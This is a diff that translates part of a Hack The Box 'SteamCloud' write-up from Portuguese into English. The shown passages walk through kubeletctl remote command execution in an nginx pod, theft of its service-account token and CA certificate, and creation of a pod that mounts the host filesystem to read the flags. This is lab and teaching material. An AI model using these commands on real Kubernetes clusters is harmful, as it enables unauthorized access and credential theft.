@@ -159,7 +159,7 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6Iktyb1dqMDc2d2tVTmxKRTZlLTZlTW9DSXJvLXBpUUlMbnhFWnVC
 ╰───────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
 ```
 
-### searching for rce
+### Searching for rce
 
 `kubeletctl scan rce --server 10.10.11.133`  
 
@@ -197,13 +197,13 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6Iktyb1dqMDc2d2tVTmxKRTZlLTZlTW9DSXJvLXBpUUlMbnhFWnVC
 
 ### RCE with kubeletctl
 
-Para confirmar que o pod `nginx` está vulnerável a rce, decidi listar os conteúdos do seu fs:
+To confirm that the nginx pod is vulnerable to RCE (Remote Code Execution), I decided to list the contents of its filesystem:
 
 `kubeletctl run "ls /" --namespace default --pod nginx --container nginx --server 10.10.11.133`
 
 ![SteamCloud-1](https://0xtonyr.github.io/assets/img/hackthebox/steamcloud/SteamCloud-1.png)
 
-Com o RCE confirmado, posso começar a enumerar o filesystem em busca do token de acesso e do certificado do pod.
+With RCE confirmed, I can start enumerating the filesystem in search of the access token and the pod's certificate.
 
 The service account access token and certificate for a Kubernetes pod are stored at `/var/run/secrets/kubernetes.io/serviceaccount/`
 
@@ -211,7 +211,7 @@ The service account access token and certificate for a Kubernetes pod are stored
 
 # Privilege escalation
 
-Obtendo o token e o certificado do pod `nginx`:
+Obtaining the token and certificate of the nginx pod:
 
 ```bash
 ┌──(root㉿kali)-[/home/kali]
@@ -241,10 +241,9 @@ kf2eZIBNMp0TFg==
 -----END CERTIFICATE-----
 ```
 
-Salvar o certificado em um arquivo de nome `ca.crt`  utilizando um editor de texto como nano, vim ou mousepad.
+Save the certificate to a file named ca.crt using a text editor like nano, vim, or mousepad.
 
-Exportar o token como variável de ambiente:
-
+Export the token as an environment variable:
 `export token=$(kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" --namespace default --pod nginx --container nginx --server 10.10.11.133)`
                                                                                                                                                      
 
@@ -252,11 +251,11 @@ Exportar o token como variável de ambiente:
 
 `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 auth can-i --list`
 
-O comando verifica as permissões de um usuário no Kubernetes, com base no token de autenticação fornecido, no certificado de autoridade de certificação (CA) e no endereço do servidor de API especificado. 
+The command checks the permissions of a user in Kubernetes based on the provided authentication token, the Certificate Authority (CA) certificate, and the specified API server address.
 
 ![SteamCloud-2](https://0xtonyr.github.io/assets/img/hackthebox/steamcloud/SteamCloud-2.png)
 
-Temos permissão `get`, `create` e `list` para `pods`.
+We have permission to get, create, and list for pods.
 
 ### Creating an evil pod
 
@@ -264,7 +263,7 @@ We can query more info about the `nginx` pod using the commandline tool `kubectl
 
 `kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token` 
 
-Criar um arquivo `.yml` de acordo com o modelo abaixo:
+"Create a .yml file according to the template below:"
 
 **f.yml**
 
@@ -289,9 +288,9 @@ spec:
  hostNetwork: true
 ```
 
-Este arquivo contém informações para montar o filesystem do sistema principal no `/root` do pod `nginxt`. É importante que `namespace` esteja como `default` e que `image` seja `nginx:1.14.2` .
+This file contains information to mount the filesystem of the main system into `/root` of the nginxt pod. It is important that the `namespace` is set to `default` and the `image` is `nginx:1.14.2.`
 
-Criando um novo pod `nginxt` :
+Creating a new `nginxt` pod:
 
 ```bash
 ┌──(root㉿kali)-[/home/kali]
@@ -299,7 +298,7 @@ Criando um novo pod `nginxt` :
 pod/nginxt created                                                                                                                                                                                                        
 ```
 
-Verificando que o pod foi criando:
+Verifying that the pod has been created:
 
 ```bash
 ┌──(root㉿kali)-[/home/kali]
@@ -309,7 +308,7 @@ nginx    1/1     Running   0          85m
 nginxt   1/1     Running   0          23s
 ```
 
-O pod foi criado com o o filesystem do sistema principal no seu diretório `/root` . Podemos então pegar as flags de usuário e root da seguinte forma:
+The pod has been created with the filesystem of the main system in its /root directory. We can then retrieve the user and root flags as follows:
 
 `kubeletctl run "cat /root/home/user/user.txt" --pod nginxt --container nginxt --server 10.10.11.133`
 
